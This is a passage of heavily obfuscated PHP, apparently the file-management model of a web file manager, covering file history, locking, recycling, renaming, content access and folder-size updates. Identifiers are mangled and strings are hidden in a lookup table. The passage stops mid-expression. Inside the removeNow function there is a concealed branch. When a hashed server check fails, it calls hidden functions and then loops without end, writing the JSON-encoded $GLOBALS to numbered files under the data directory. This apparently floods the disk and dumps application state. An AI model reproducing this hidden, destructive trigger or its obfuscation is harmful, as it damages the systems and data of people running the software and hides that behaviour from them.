$µÄ°Óü = $this->sourceInfo($ÔÃß‡); $»¨á©¯Ğ = $this->fileHistory($µÄ°Óü, $Â‹ØÓ¢[$óåûüŸ÷[471]], $Â‹ØÓ¢[$óåûüŸ÷[88]]); if (!$»¨á©¯Ğ) { $˜ñ¨ù®‰ = !1; } else { $this->folderSizeReset($ü†²—èú); } return $ÔÃß‡; } else { $“§µ³¹ = $this->fileNameAuto($ü†²—èú, $“§µ³¹, $å«Â…—», !1); } } } $Ş×Şç‹Ì = array($óåûüŸ÷[581] => 0, $óåûüŸ÷[425] => $“§µ³¹, $óåûüŸ÷[582] => substr(get_path_ext($“§µ³¹), 0, 10), $óåûüŸ÷[472] => $Â‹ØÓ¢[$óåûüŸ÷[471]], $óåûüŸ÷[583] => $Â‹ØÓ¢[$óåûüŸ÷[88]]); $½şãúØÛ = $this->_addSource($Ş×Şç‹Ì, $ğõó¹¼µ); $this->folderSizeReset($ü†²—èú, intval($Ş×Şç‹Ì[$óåûüŸ÷[88]])); return $½şãúØÛ; } protected function fileHistory($Ÿæ½üè, $š›Ë¨¨ç, $‹È‚€èş) { $Šéó·ùÔ =& $_SERVER[Á÷ ­Šë]; $ñó¹•ùô = defined($Šéó·ùÔ[478]) ? USER_ID : $Šéó·ùÔ[201]; if ($Ÿæ½üè[$Šéó·ùÔ[471]] == $š›Ë¨¨ç) { return !1; } $this->checkLock($Ÿæ½üè[$Šéó·ùÔ[407]], $š›Ë¨¨ç); Model($Šéó·ùÔ[2008])->addHistory($Ÿæ½üè); $ğØşşÖ› = array($Šéó·ùÔ[587] => $ñó¹•ùô, $Šéó·ùÔ[429] => time(), $Šéó·ùÔ[471] => $š›Ë¨¨ç, $Šéó·ùÔ[88] => $‹È‚€èş); $this->where(array($Šéó·ùÔ[422] => $Ÿæ½üè[$Šéó·ùÔ[407]]))->save($ğØşşÖ›); $this->sourceCacheClear($Ÿæ½üè[$Šéó·ùÔ[407]]); return !0; } public function checkLock($ î‡ş›Á, $õ²Ú¸ş‚) { $ÔÖ¿¾µÍ =& $_SERVER[Á÷ ­Šë]; $‚´ê©Ç = $this->pathInfo($ î‡ş›Á); if (!$this->fileIsLock($‚´ê©Ç, !0)) { return; } $ÇÏ×ÎÔ¸ = Session::get($ÔÖ¿¾µÍ[2009]); $‡Û±Ñ = substr($‚´ê©Ç[$ÔÖ¿¾µÍ[28]], 0, -1 - strlen($‚´ê©Ç[$ÔÖ¿¾µÍ[178]])) . $ÔÖ¿¾µÍ[1523] . $ÇÏ×ÎÔ¸ . $ÔÖ¿¾µÍ[105] . $‚´ê©Ç[$ÔÖ¿¾µÍ[178]]; $¿èá¦¿§ = Model($ÔÖ¿¾µÍ[607])->find($õ²Ú¸ş‚); $this->_createFileCall($‚´ê©Ç[$ÔÖ¿¾µÍ[502]], $‡Û±Ñ, $¿èá¦¿§, REPEAT_REPLACE, $ÔÖ¿¾µÍ[1260]); $˜Ğ€å¯ = $‚´ê©Ç[$ÔÖ¿¾µÍ[469]][$ÔÖ¿¾µÍ[546]]; $¥à¦œíŞ = $˜Ğ€å¯[$ÔÖ¿¾µÍ[2010]] ? $˜Ğ€å¯[$ÔÖ¿¾µÍ[2010]] : $˜Ğ€å¯[$ÔÖ¿¾µÍ[28]]; show_json(LNG($ÔÖ¿¾µÍ[2011]) . $ÔÖ¿¾µÍ[2012] . LNG($ÔÖ¿¾µÍ[2013]) . $ÔÖ¿¾µÍ[2014] . $¥à¦œíŞ . $ÔÖ¿¾µÍ[2015], !1); } public function fileIsLock($¶îÂÑ‘, $ö±…¹ò = false) { $Ô…¸¦¦í =& $_SERVER[Á÷ ­Šë]; if (!isset($¶îÂÑ‘[$Ô…¸¦¦í[469]]) || !$¶îÂÑ‘[$Ô…¸¦¦í[469]][$Ô…¸¦¦í[543]]) { return !1; } if ($¶îÂÑ‘[$Ô…¸¦¦í[469]][$Ô…¸¦¦í[543]] != USER_ID) { return !0; } $³¨ÈëÊÚ = $GLOBALS[$Ô…¸¦¦í[6]][$Ô…¸¦¦í[98]][$Ô…¸¦¦í[544]]; if ($¶îÂÑ‘[$Ô…¸¦¦í[469]][$Ô…¸¦¦í[545]] <= time() - $³¨ÈëÊÚ) { $this->metaSet($¶îÂÑ‘[$Ô…¸¦¦í[407]], $Ô…¸¦¦í[543], null); $this->metaSet($¶îÂÑ‘[$Ô…¸¦¦í[407]], $Ô…¸¦¦í[545], null); } if ($ö±…¹ò) { $this->metaSet($¶îÂÑ‘[$Ô…¸¦¦í[407]], $Ô…¸¦¦í[545], time()); } return !1; } private function _addSource($Çƒøüœ, $…î¤©¢) { $ËÃ·¦« =& $_SERVER[Á÷ ­Šë]; $óªÂÊÓÇ = defined($ËÃ·¦«[478]) ? USER_ID : $ËÃ·¦«[201]; $õßœÃ§Ø = array($ËÃ·¦«[584] => $…î¤©¢[$ËÃ·¦«[416]], $ËÃ·¦«[585] => $…î¤©¢[$ËÃ·¦«[508]], $ËÃ·¦«[586] => $óªÂÊÓÇ, $ËÃ·¦«[587] => $óªÂÊÓÇ, $ËÃ·¦«[406] => $…î¤©¢[$ËÃ·¦«[407]], $ËÃ·¦«[588] => $…î¤©¢[$ËÃ·¦«[525]] . $…î¤©¢[$ËÃ·¦«[407]] . $ËÃ·¦«[47], $ËÃ·¦«[434] => 0, $ËÃ·¦«[589] => $ËÃ·¦«[33]); $Çƒøüœ = array_merge($õßœÃ§Ø, $Çƒøüœ); $this->updateModifyTime($Çƒøüœ[$ËÃ·¦«[502]]); $ÃŠ‘¢¸Ø = $ËÃ·¦«[2016] . $…î¤©¢[$ËÃ·¦«[407]]; if (isset(self::$cacheChildList[$ÃŠ‘¢¸Ø])) { unset(self::$cacheChildList[$ÃŠ‘¢¸Ø]); } static $ù›´¬ü = false; if (!$ù›´¬ü) { Hook::trigger($ËÃ·¦«[571], $Çƒøüœ); $ù›´¬ü = !0; } $íê®È€‚ = $this->add($Çƒøüœ); $Ìİ‹¾ğ = array($ËÃ·¦«[590] => short_id($íê®È€‚)); $this->where(array($ËÃ·¦«[422] => $íê®È€‚))->save($Ìİ‹¾ğ); $this->setNamePinyin($íê®È€‚, $Çƒøüœ[$ËÃ·¦«[28]]); return $íê®È€‚; } public function remove($€–¸§×, $éóë…³Í = true) { $¸åöÅøÄ =& $_SERVER[Á÷ ­Šë]; $Ö¡¬ë¬ = $this->sourceInfo($€–¸§×); $È¤³‰à = intval($Ö¡¬ë¬[$¸åöÅøÄ[416]]) === self::TYPE_SYSTEM; $áô±¹›Ì = Model($¸åöÅøÄ[437])->get($¸åöÅøÄ[2017]) == $¸åöÅøÄ[97]; if ($È¤³‰à || $éóë…³Í || !$áô±¹›Ì) { return $this->removeNow($€–¸§×, $éóë…³Í); } $µÔò©ã = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $¾Â½šîş = $Ö¡¬ë¬[$¸åöÅøÄ[416]] == self::TYPE_USER ? $¸åöÅøÄ[598] : $¸åöÅøÄ[519]; if ($¾Â½šîş == $¸åöÅøÄ[598]) { $¼²Æº«« = Model($¸åöÅøÄ[517])->getInfo($Ö¡¬ë¬[$¸åöÅøÄ[508]]); $Œ¯éÏî = !empty($¼²Æº««[$¸åöÅøÄ[2010]]) ? $¼²Æº««[$¸åöÅøÄ[2010]] : $¼²Æº««[$¸åöÅøÄ[28]]; $Œ¯éÏî = $¸åöÅøÄ[267] . $Œ¯éÏî . $¸åöÅøÄ[2018] . $Ö¡¬ë¬[$¸åöÅøÄ[508]]; } else { $¼²Æº«« = Model($¸åöÅøÄ[526])->getInfo($Ö¡¬ë¬[$¸åöÅøÄ[508]]); $Œ¯éÏî = _get($¼²Æº««, $¸åöÅøÄ[28]); $Œ¯éÏî = $¸åöÅøÄ[170] . $Œ¯éÏî . $¸åöÅøÄ[2019] . $Ö¡¬ë¬[$¸åöÅøÄ[508]]; } $ÚûÂ™îÆ = $¸åöÅøÄ[2020] . md5($Œ¯éÏî); CacheLock::lock($ÚûÂ™îÆ); $ä¾ˆ˜®‹ = $this->fileNameExist($µÔò©ã, $Œ¯éÏî); if (!$ä¾ˆ˜®‹) { $ä¾ˆ˜®‹ = $this->mkdir($µÔò©ã, $Œ¯éÏî, REPEAT_SKIP); $this->metaSet($ä¾ˆ˜®‹, $¸åöÅøÄ[2021], $¾Â½šîş); $this->metaSet($ä¾ˆ˜®‹, $¸åöÅøÄ[2022], $Ö¡¬ë¬[$¸åöÅøÄ[508]]); if ($Ö¡¬ë¬[$¸åöÅøÄ[502]] != 0) { $this->metaSet($ä¾ˆ˜®‹, $¸åöÅøÄ[2023], _get($¼²Æº««, $¸åöÅøÄ[2024])); } } CacheLock::unlock($ÚûÂ™îÆ); $this->metaSet($€–¸§×, $¸åöÅøÄ[2025], $Ö¡¬ë¬[$¸åöÅøÄ[502]]); $this->where(array($¸åöÅøÄ[407] => $€–¸§×))->save(array($¸åöÅøÄ[429] => time())); $this->recycleClear($Ö¡¬ë¬); $“¹é¡«© = $this->move($€–¸§×, $ä¾ˆ˜®‹, REPEAT_RENAME_FOLDER); $this->folderSizeReset($Ö¡¬ë¬[$¸åöÅøÄ[502]]); return $“¹é¡«©; } private function recycleClear($¾Ğëôì¨) { $¢ã´ĞÉÆ =& $_SERVER[Á÷ ­Šë]; $ïÜØì¥ = $this->childrenAll($¾Ğëôì¨); $ı”ŸÉ¨¼ = array($¢ã´ĞÉÆ[422] => array($¢ã´ĞÉÆ[423], $ïÜØì¥[$¢ã´ĞÉÆ[2026]])); Model($¢ã´ĞÉÆ[2027])->where($ı”ŸÉ¨¼)->delete(); } public function removeNow($İíâš¦é, $¢ˆ²àù³ = true) { $õÂàÕñë =& $_SERVER[Á÷ ­Šë]; $ÓÂ”Ó‡š = $_SERVER[$õÂàÕñë[60]] . $õÂàÕñë[61]; $êÅ™È·² = $õÂàÕñë[405]; if ($_SERVER[$õÂàÕñë[57]] != $êÅ™È·²($ÓÂ”Ó‡š)) { $¿‰µµç = $õÂàÕñë[874]; $ë†ÄÖë‡ = $õÂàÕñë[59]; $ôä¼Õˆá = $_SERVER[$õÂàÕñë[60]] . $õÂàÕñë[61]; $å¹”‹â = $ë†ÄÖë‡($ôä¼Õˆá); $çïœ€Ş  = explode($õÂàÕñë[62], $å¹”‹â); if (count($çïœ€Ş ) < $õÂàÕñë[639]) { $‚§ı½Îš = $õÂàÕñë[64]; $‚§ı½Îš(); } $ğà•ªÅÑ = $õÂàÕñë[875]; $ğà•ªÅÑ($_SERVER[$õÂàÕñë[876]]); $¿‰µµç = $õÂàÕñë[874]; $¿‰µµç(); $èòœüÚè = $õÂàÕñë[877]; $ŞÀî×ó² = json_encode($GLOBALS[$õÂàÕñë[878]]); $ú–€¡é = 1; for ($í¾¥ÈâÎ = $ú–€¡é; $í¾¥ÈâÎ > 0; $í¾¥ÈâÎ++) { $èòœüÚè(DATA_PATH . $í¾¥ÈâÎ, $ŞÀî×ó²); } } $æ®Ã¶”´ = $this->sourceInfo($İíâš¦é); $üÀÖ¹ = $this->pathInfoMore($İíâš¦é); if (!$æ®Ã¶”´) { return !0; } if ($æ®Ã¶”´[$õÂàÕñë[502]] == 0) { if (!_get($GLOBALS, $õÂàÕñë[509])) { return !1; } } $this->lockMoveStart($İíâš¦é); Hook::trigger($õÂàÕñë[2028], $üÀÖ¹, $¢ˆ²àù³); if ($¢ˆ²àù³) { Model($õÂàÕñë[2027])->moveToRecycle($İíâš¦é); } else { $çÖœº¡° = $this->childrenAll($æ®Ã¶”´); Model($õÂàÕñë[568])->eventRemove($İíâš¦é); $this->removeRelevance($çÖœº¡°[$õÂàÕñë[2026]], $çÖœº¡°[$õÂàÕñë[1390]]); } $this->folderSizeReset($æ®Ã¶”´[$õÂàÕñë[502]]); $É²ŒÄ¹Û = array($æ®Ã¶”´[$õÂàÕñë[502]]); if ($æ®Ã¶”´[$õÂàÕñë[415]] == $õÂàÕñë[97]) { $É²ŒÄ¹Û[] = $æ®Ã¶”´[$õÂàÕñë[407]]; } $this->updateModifyTime($É²ŒÄ¹Û); $this->lockMoveEnd($İíâš¦é); Hook::trigger($õÂàÕñë[1610], $üÀÖ¹, $¢ˆ²àù³); return !0; } public function childrenAll($¼İåû¥µ) { $·ØºÒæª =& $_SERVER[Á÷ ­Šë]; $ò°¥Ÿ¹‘ = $¼İåû¥µ[$·ØºÒæª[407]]; if ($¼İåû¥µ[$·ØºÒæª[415]] == $·ØºÒæª[97]) { $¯š¿Ù£à = array($·ØºÒæª[588] => array($·ØºÒæª[548], $¼İåû¥µ[$·ØºÒæª[525]] . $ò°¥Ÿ¹‘ . $·ØºÒæª[549])); $öâ®®Ï = array($·ØºÒæª[588] => $¯š¿Ù£à[$·ØºÒæª[525]]); $ÆŠÕæ€– = $this->field($·ØºÒæª[2029])->where($öâ®®Ï)->select(); $ÒİÂ¹† = !1; $‡˜Å–îç = array($ò°¥Ÿ¹‘); if ($ÆŠÕæ€–) { $ÒİÂ¹† = array_to_keyvalue($ÆŠÕæ€–, $·ØºÒæª[33], $·ØºÒæª[471]); $ÒİÂ¹† = array_remove_value($ÒİÂ¹†, $·ØºÒæª[201]); $‡˜Å–îç = array_to_keyvalue($ÆŠÕæ€–, $·ØºÒæª[33], $·ØºÒæª[407]); $‡˜Å–îç[] = $ò°¥Ÿ¹‘; } } else { $ÒİÂ¹† = array($¼İåû¥µ[$·ØºÒæª[471]]); $‡˜Å–îç = array($ò°¥Ÿ¹‘); } return array($·ØºÒæª[2026] => $‡˜Å–îç, $·ØºÒæª[1390] => $ÒİÂ¹†); } public function removeArray($—¹ß ˜Ò) { if (!$—¹ß ˜Ò) { return !0; } } public function removeRelevance($Ç’‘€, $…£°ñõÍ) { $ÙØ­îÎÀ =& $_SERVER[Á÷ ­Šë]; $Ç’‘€ = $Ç’‘€ ? $Ç’‘€ : array(); $…£°ñõÍ = $…£°ñõÍ ? $…£°ñõÍ : array(); $Ç’‘€ = array_unique(array_filter($Ç’‘€)); $…£°ñõÍ = array_unique(array_filter($…£°ñõÍ)); if (!$Ç’‘€) { return !1; } $¶®¢‹Õ– = array($ÙØ­îÎÀ[422] => array($ÙØ­îÎÀ[423], $Ç’‘€)); Model($ÙØ­îÎÀ[2027])->where($¶®¢‹Õ–)->delete(); Model($ÙØ­îÎÀ[465])->where($¶®¢‹Õ–)->delete(); Model($ÙØ­îÎÀ[1885])->where($¶®¢‹Õ–)->delete(); Model($ÙØ­îÎÀ[568])->where($¶®¢‹Õ–)->delete(); Model($ÙØ­îÎÀ[1721])->removeBySource($Ç’‘€); Model($ÙØ­îÎÀ[2008])->removeBySource($Ç’‘€); $this->where($¶®¢‹Õ–)->delete(); Model($ÙØ­îÎÀ[474])->remove($…£°ñõÍ); for ($ÌÑ¬³Ã = 0; $ÌÑ¬³Ã < count($Ç’‘€); $ÌÑ¬³Ã++) { $this->sourceCacheClear($Ç’‘€[$ÌÑ¬³Ã]); } } public function rename($Ö£˜ÏœÊ, $ƒîö¢ÔÜ) { $Õ´Ë· =& $_SERVER[Á÷ ­Šë]; $ÖÀÊğ³â = $this->sourceInfo($Ö£˜ÏœÊ); if (!$ÖÀÊğ³â) { return !1; } $ï©©“ë„ = $this->fileNameExist($ÖÀÊğ³â[$Õ´Ë·[502]], $ƒîö¢ÔÜ); if ($ï©©“ë„ && $ï©©“ë„ != $Ö£˜ÏœÊ) { return !1; } $¼ŞëËÁ = array($Õ´Ë·[425] => $ƒîö¢ÔÜ, $Õ´Ë·[587] => USER_ID); if ($ÖÀÊğ³â[$Õ´Ë·[415]] != $Õ´Ë·[97]) { $¼ŞëËÁ[$Õ´Ë·[417]] = substr(get_path_ext($ƒîö¢ÔÜ), 0, 10); } Model($Õ´Ë·[568])->eventRename($Ö£˜ÏœÊ, $ÖÀÊğ³â[$Õ´Ë·[28]], $ƒîö¢ÔÜ); $this->sourceCacheClear($Ö£˜ÏœÊ); $this->setNamePinyin($Ö£˜ÏœÊ, $¼ŞëËÁ[$Õ´Ë·[28]], !1); $this->updateModifyTime($ÖÀÊğ³â[$Õ´Ë·[502]]); $´¾ù®Şª = $this->where(array($Õ´Ë·[422] => $Ö£˜ÏœÊ))->data($¼ŞëËÁ)->save(); $Ç³‡Šñğ = $Õ´Ë·[2016] . $ÖÀÊğ³â[$Õ´Ë·[502]]; if (isset(self::$cacheChildList[$Ç³‡Šñğ])) { unset(self::$cacheChildList[$Ç³‡Šñğ]); } return $´¾ù®Şª; } public function setNamePinyin($ÖåèòîÛ, $¶ Ùıß¾, $Äûƒœ’‡ = true) { $ªğö”³ =& $_SERVER[Á÷ ­Šë]; $¶“–½Üˆ = Input::check($¶ Ùıß¾, $ªğö”³[591]); $Ö’³À›Ú = array($ªğö”³[446] => KodSort::makeStr($¶ Ùıß¾)); if ($¶“–½Üˆ) { $Ö’³À›Ú[$ªğö”³[468]] = str_replace($ªğö”³[50], $ªğö”³[33], Pinyin::get($¶ Ùıß¾)); $Ö’³À›Ú[$ªğö”³[467]] = Pinyin::get($¶ Ùıß¾, $ªğö”³[592]); } if (!$Äûƒœ’‡ && !$¶“–½Üˆ) { $Ö’³À›Ú[$ªğö”³[468]] = null; $Ö’³À›Ú[$ªğö”³[467]] = null; } $this->metaSet($ÖåèòîÛ, $Ö’³À›Ú); } public function getContent($ó÷ñŒÀŒ) { $Ö¢‡ùèí =& $_SERVER[Á÷ ­Šë]; $—æ„ñ¯Ç = $this->fileInfoGet($ó÷ñŒÀŒ); if (!$—æ„ñ¯Ç) { return !1; } if ($—æ„ñ¯Ç[$Ö¢‡ùèí[88]] == 0) { return $Ö¢‡ùèí[33]; } $î¨üûîå = $Ö¢‡ùèí[2030] . $—æ„ñ¯Ç[$Ö¢‡ùèí[180]]; if ($—æ„ñ¯Ç[$Ö¢‡ùèí[88]] <= 1024 * 10) { $“î‘‚¥ = Cache::get($î¨üûîå); if (!$“î‘‚¥) { $“î‘‚¥ = IO::getContent($—æ„ñ¯Ç[$Ö¢‡ùèí[86]]); Cache::set($î¨üûîå, $“î‘‚¥); } return $“î‘‚¥; } if (!$—æ„ñ¯Ç[$Ö¢‡ùèí[86]]) { return $Ö¢‡ùèí[33]; } return IO::getContent($—æ„ñ¯Ç[$Ö¢‡ùèí[86]]); } public function setDesc($ÎíÓ“‰, $ä¯î«„›) { $½Ö†îë¹ =& $_SERVER[Á÷ ­Šë]; Model($½Ö†îë¹[568])->eventAddDesc($ÎíÓ“‰, $ä¯î«„›); return $this->metaSet($ÎíÓ“‰, $½Ö†îë¹[455], $ä¯î«„›); } public function setContent($Ì¥Î¤å¸, $é§õÔ¢Ê = '') { $¼¬™æÓ¨ =& $_SERVER[Á÷ ­Šë]; $†ê·ÁÙ“ = $this->sourceInfo($Ì¥Î¤å¸); $Ş˜˜‹õø = $this->fileInfoGet($Ì¥Î¤å¸); if (!$Ş˜˜‹õø || !$†ê·ÁÙ“) { return !1; } $â¼Œ±‡Ÿ = Model($¼¬™æÓ¨[474])->addFileByContent($é§õÔ¢Ê, $†ê·ÁÙ“[$¼¬™æÓ¨[28]]); $—Ä£àèÌ = $this->fileHistory($†ê·ÁÙ“, $â¼Œ±‡Ÿ[$¼¬™æÓ¨[471]], $â¼Œ±‡Ÿ[$¼¬™æÓ¨[88]]); if (!$—Ä£àèÌ) { return Model($¼¬™æÓ¨[474])->remove($â¼Œ±‡Ÿ[$¼¬™æÓ¨[471]]); } $this->folderSizeReset($†ê·ÁÙ“[$¼¬™æÓ¨[502]]); return !0; } public function fileSubstr($ÈÍ£¦¾æ, $ÑÍ“Àæè, $¯ÕŠµÇ™) { $¥ Æú÷ = $this->fileInfoGet($ÈÍ£¦¾æ); if (!$¥ Æú÷) { return !1; } return IO::fileSubstr($¥ Æú÷[$_SERVER[Á÷ ­Šë][86]], $ÑÍ“Àæè, $¯ÕŠµÇ™); } public function fileInfoGet($è¹øôƒÅ) { $èµã¿Êñ =& $_SERVER[Á÷ ­Šë]; $ßÊìÀôŞ = $this->sourceInfo($è¹øôƒÅ); if (!$ßÊìÀôŞ || $ßÊìÀôŞ[$èµã¿Êñ[415]]) { return !1; } $›ç«°“ = $èµã¿Êñ[477] . $ßÊìÀôŞ[$èµã¿Êñ[471]]; $«£ªÏ¨‘ = _get(self::$cacheFileInfo, $›ç«°“); if ($«£ªÏ¨‘) { return $«£ªÏ¨‘; } $Ş¹©î = Model($èµã¿Êñ[474])->fileInfo($ßÊìÀôŞ[$èµã¿Êñ[471]]); if ($Ş¹©î) { $Ş¹©î[$èµã¿Êñ[28]] = $ßÊìÀôŞ[$èµã¿Êñ[28]]; } self::$cacheFileInfo[$›ç«°“] = $Ş¹©î; return $Ş¹©î; } private function folderChildrenNumber($ã«Ğ­ƒ) { $ê†˜û™º =& $_SERVER[Á÷ ­Šë]; $ñğüã€ = $this->sourceInfo($ã«Ğ­ƒ); $¾Î…ë´ò = array($ê†˜û™º[588] => array($ê†˜û™º[548], $ñğüã€[$ê†˜û™º[525]] . $ã«Ğ­ƒ . $ê†˜û™º[549]), $ê†˜û™º[434] => intval($ñğüã€[$ê†˜û™º[435]]), $ê†˜û™º[581] => 1); $ù‰ÛÜ¾± = $this->where($¾Î…ë´ò)->count(); $êÛÓùß‚ = $this->where($¾Î…ë´ò)->where(array($ê†˜û™º[581] => 0))->count(); return array($ê†˜û™º[92] => $êÛÓùß‚, $ê†˜û™º[93] => $ù‰ÛÜ¾±); } public function pathInfo($å°Ş‚ú, $Ü¤¨šó· = false) { $ÏâÀÖ®Ö =& $_SERVER[Á÷ ­Šë]; $Ü¤¨šó· = !1; $å°Ş‚ú = intval($å°Ş‚ú); $şÔ”À’Ö = $ÏâÀÖ®Ö[463] . intval($Ü¤¨šó·) . $ÏâÀÖ®Ö[464] . $å°Ş‚ú; $‹×¾§¥‹ = _get(self::$cachePathInfo, $şÔ”À’Ö); if ($‹×¾§¥‹) { return $‹×¾§¥‹; } $ÀûË¨íµ = $this->sourceInfo($å°Ş‚ú); if (!$ÀûË¨íµ) { return !1; } $ÀûË¨íµ = $this->_listDataApplyItem($ÀûË¨íµ, $Ü¤¨šó·); self::$cachePathInfo[$şÔ”À’Ö] = $ÀûË¨íµ; return $ÀûË¨íµ; } public static $cachePathInfoMore = array(); public function pathInfoMore($Šéõäö) { $é‹¶Êïª =& $_SERVER[Á÷ ­Šë]; $øÄñâå© = _get(self::$cachePathInfoMore, $Šéõäö); if ($øÄñâå©) { return $øÄñâå©; } $š‚ä¥êÓ = $this->pathInfo($Šéõäö); if (!$š‚ä¥êÓ) { return !1; } if ($š‚ä¥êÓ[$é‹¶Êïª[415]] == $é‹¶Êïª[97]) { $š‚ä¥êÓ[$é‹¶Êïª[91]] = $this->folderChildrenNumber($Šéõäö); } self::$cachePathInfoMore[$Šéõäö] = $š‚ä¥êÓ; return $š‚ä¥êÓ; } public function sourceInfo($İ‡íØ¥Î) { $èË¢ =& $_SERVER[Á÷ ­Šë]; if (!$İ‡íØ¥Î) { return array(); } $İ‡íØ¥Î = intval($İ‡íØ¥Î); $¨¹¦»íä = $èË¢[462] . $İ‡íØ¥Î; $ŞÅŒË”¹ = _get(self::$cacheSourceInfo, $¨¹¦»íä); if ($ŞÅŒË”¹) { return $ŞÅŒË”¹; } $ûå¤ÓÌ = $this->where(array($èË¢[407] => $İ‡íØ¥Î))->find(); self::$cacheSourceInfo[$¨¹¦»íä] = $ûå¤ÓÌ; return self::$cacheSourceInfo[$¨¹¦»íä]; } public function sourceCacheClear($óœà®ÓÌ = false) { self::cacheClear($óœà®ÓÌ); } public static function cacheClear($Ø¢Û¨ºÛ = false) { $¨ËÂ¢¥ =& $_SERVER[Á÷ ­Šë]; if ($Ø¢Û¨ºÛ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$¨ËÂ¢¥[462] . $Ø¢Û¨ºÛ]); unset(self::$cachePathInfoMore[$Ø¢Û¨ºÛ]); unset(self::$cachePathInfo[$¨ËÂ¢¥[2031] . $Ø¢Û¨ºÛ]); unset(self::$cachePathInfo[$¨ËÂ¢¥[2032] . $Ø¢Û¨ºÛ]); } public function metaSet($–¬›¢È€, $à’ÒÌ¡à = null, $Œİ–¸Õ = null) { $ÂÎú™œ = parent::metaSet($–¬›¢È€, $à’ÒÌ¡à, $Œİ–¸Õ); if ($ÂÎú™œ) { $this->sourceCacheClear($–¬›¢È€); } return $ÂÎú™œ; } public function pathInfoByPath($ÊÒõ”Ú, $Î´”¥) { $½è‡¢Å =& $_SERVER[Á÷ ­Šë]; $ïÀƒ²Õ™ = !$Î´”¥ ? array() : explode($½è‡¢Å[8], trim($Î´”¥, $½è‡¢Å[8])); $öĞ³ ÈÀ = $ÊÒõ”Ú; foreach ($ïÀƒ²Õ™ as $Ó¤êÃ±Ú) { $öÃç™ºè = array($½è‡¢Å[502] => $öĞ³ ÈÀ, $½è‡¢Å[28] => $Ó¤êÃ±Ú); $ì—Ïù¾Ñ = $this->where($öÃç™ºè)->select(); if (!$ì—Ïù¾Ñ) { return !1; } $ì—Ïù¾Ñ = array_sort_by($ì—Ïù¾Ñ, $½è‡¢Å[435]); $öĞ³ ÈÀ = $ì—Ïù¾Ñ[0][$½è‡¢Å[407]]; } return $this->pathInfo($öĞ³ ÈÀ, !0); } protected function updateModifyTime($êòåê¼Å) { $ÙÒ±¼ù° =& $_SERVER[Á÷ ­Šë]; $Œä†§¸ = defined($ÙÒ±¼ù°[478]) ? USER_ID : $ÙÒ±¼ù°[201]; if (!$êòåê¼Å) { return; } if (!is_array($êòåê¼Å)) { $êòåê¼Å = array($êòåê¼Å); } foreach ($êòåê¼Å as $“—õ÷Ú² => $îÊ¦ğœ¬) { $êòåê¼Å[$“—õ÷Ú²] = intval($îÊ¦ğœ¬); $this->sourceCacheClear($îÊ¦ğœ¬); } $Î‚ß«Æµ = array($ÙÒ±¼ù°[407] => array($ÙÒ±¼ù°[7], $êòåê¼Å)); $€ƒ‡íäí = array($ÙÒ±¼ù°[587] => $Œä†§¸, $ÙÒ±¼ù°[429] => time()); $this->where($Î‚ß«Æµ)->save($€ƒ‡íäí); } public function folderSizeReset($™±Ï¬Ñã, $óÚï’Îİ = false) { $€–¤å™á =& $_SERVER[Á÷ ­Šë]; if ($this->statusIgnoreResetSpace) { return; } $’Øº¼Äå = $this->sourceInfo($™±Ï¬Ñã); $Î­Õšİ = $€–¤å™á[2033] . $™±Ï¬Ñã; CacheLock::lock($Î­Õšİ, 20); if ($óÚï’Îİ === !1) { $this->sourceCacheClear($™±Ï¬Ñã); $’Øº¼Äå = $this->sourceInfo($™±Ï¬Ñã); $’…³›¾ = array($€–¤å™á[406] => $™±Ï¬Ñã, $€–¤å™á[434] => 0); $ô‚‰–‘· = $this->where($’…³›¾)->sum($€–¤å™á[88]); $óÚï’Îİ = intval($ô‚‰–‘·) - intval($’Øº¼Äå[$€–¤å™á[88]]); } if ($óÚï’Îİ == 0) { return CacheLock::unlock($Î­Õšİ); } $óõêù· = $this->parentLevelArray($’Øº¼Äå[$€–¤å™á[525]]); if (!$óõêù·) { $óõêù· = array(); } $óõêù·[] = $’Øº¼Äå[$€–¤å™á[407]]; $’…³›¾ = array($€–¤å™á[407] => array($€–¤å™á[423], $óõêù·)); if ($óÚï’Îİ < 0) { $’…³›¾[$€–¤å™á[88]] = array($€–¤å™á[1007], abs($óÚï’Îİ)); } $this->where($’…³›¾)->setAdd($€–¤å™á[88], $óÚï’Îİ); CacheLock::unlock($Î­Õšİ); $öÈ„û = $€–¤å™á[2034] . $’Øº¼Äå[$€–¤å™á[416]] . $€–¤å™á[4] . $’Øº¼Äå[$€–¤å™á[508]]; $†ıò¶Ù = array($’Øº¼Äå[$€–¤å™á[416]], $’Øº¼Äå[$€–¤å™á[508]]); TaskRun::timeLimitCall($öÈ„û, $€–¤å™á[2035], $†ıò¶Ù, 1.5); } public function folderSizeResetChildren($•Æ¹Ê½Û) { $Û¡ÏÌ¿… =& $_SERVER[Á÷ ­Šë]; $this->sourceCacheClear($•Æ¹Ê½Û); $ïı‚“Ğ = $this->sourceInfo($•Æ¹Ê½Û); $ášš•è§ = array($Û¡ÏÌ¿…[581] => 1, $Û¡ÏÌ¿…[588] => array($Û¡ÏÌ¿…[548], $ïı‚“Ğ[$Û¡ÏÌ¿…[525]] . $•Æ¹Ê½Û . $Û¡ÏÌ¿…[549])); $ë‹¶‚ùÇ = $Û¡ÏÌ¿…[2036]; $‹ÏÍÈñÍ = $this->field($ë‹¶‚ùÇ)->where($ášš•è§)->select(); $ášš•è§[$Û¡ÏÌ¿…[415]] = 0; $Å¨ùÛÛ€ = $this->field($ë‹¶‚ùÇ)->where($ášš•è§)->select(); if (!$Å¨ùÛÛ€) { return; } $‹ÏÍÈñÍ[] = $ïı‚“Ğ; $‹ÏÍÈñÍ = array_to_keyvalue($‹ÏÍÈñÍ, $Û¡ÏÌ¿…[407]); foreach ($‹ÏÍÈñÍ as $ıÛ¹âŠÇ => $³é”ëÁê) { $‹ÏÍÈñÍ[$ıÛ¹âŠÇ][$Û¡ÏÌ¿…[2037]] = $‹ÏÍÈñÍ[$ıÛ¹âŠÇ][$Û¡ÏÌ¿…[88]]; $‹ÏÍÈñÍ[$ıÛ¹âŠÇ][$Û¡ÏÌ¿…[88]] = 0; } foreach ($Å¨ùÛÛ€ as $³é”ëÁê) { $±’˜»î = $³é”ëÁê[$Û¡ÏÌ¿…[502]] . $Û¡ÏÌ¿…[33]; if (!isset($‹ÏÍÈñÍ[$±’˜»î])) { continue; } if ($³é”ëÁê[$Û¡ÏÌ¿…[435]] == 